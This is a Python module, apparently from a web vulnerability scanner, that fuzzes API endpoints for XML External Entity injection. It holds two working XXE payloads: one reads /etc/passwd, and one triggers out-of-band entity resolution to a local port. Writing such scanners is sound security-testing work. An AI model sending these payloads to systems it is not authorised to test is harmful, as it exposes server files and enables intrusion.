import logging
import asyncio
from typing import Dict, Any, List

logger = logging.getLogger(__name__)

class XxeFuzzer:
    # Classic XXE payload to exfiltrate /etc/passwd
    XXE_PAYLOADS = [
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://127.0.0.1:9090/xxe_test"> %aaa;]>
<xmlrootname></xmlrootname>"""
    ]

    @staticmethod
    async def run_xxe_tests(client, scan_id: int, base_url: str, endpoint: Dict[str, Any], headers: Dict[str, str], repo) -> List[Dict]:
        vulns = []
        method = endpoint["method"]
        path = endpoint["path"]
        
        # XXE primarily affects body-bearing requests (POST/PUT/PATCH)
        if method in ["POST", "PUT", "PATCH"]:
            xml_headers = headers.copy()
            xml_headers["Content-Type"] = "application/xml"
            
            for payload in XxeFuzzer.XXE_PAYLOADS:
                try:
                    resp = await client.request(method, f"{base_url}{path}", headers=xml_headers, content=payload)
                    
                    if 200 <= resp.status_code < 500:
                        # Check local file inclusion via XXE
                        if "root:x:0:0" in resp.text:
                            logger.info(f"Scan {scan_id}: CRITICAL XXE FOUND at {method} {path}")
                            vuln_data = {
                                "vuln_type": "XML External Entity (XXE) Injection",
                                "endpoint": f"{method} {path}",
                                "description": "The endpoint processes untrusted XML input without disabling external entity resolution. The payload successfully exfiltrated `file:///etc/passwd`.",
                                "severity": "Critical",
                                "evidence": f"Response contained system file contents: {resp.text[:100]}..."
                            }
                            repo.add_vulnerability(scan_id, vuln_data)
                            vulns.append(vuln_data)
                            break
                            
                        # If error states "failed to load external entity" pointing to 127.0.0.1, it resolved it!
                        if "failed to load external entity" in resp.text.lower() and "127.0.0.1:9090/xxe_test" in resp.text:
                            logger.info(f"Scan {scan_id}: BLIND XXE RESOLUTION FOUND at {method} {path}")
                            vuln_data = {
                                "vuln_type": "Blind XML External Entity (XXE) Injection",
                                "endpoint": f"{method} {path}",
                                "description": "The endpoint attempts to resolve external XML entities as verified through an outbound error message (OOB resolution).",
                                "severity": "High",
                                "evidence": f"System error confirming entity resolution: {resp.text[:100]}"
                            }
                            repo.add_vulnerability(scan_id, vuln_data)
                            vulns.append(vuln_data)
                            break
                            
                except Exception as e:
                    pass

        return vulns
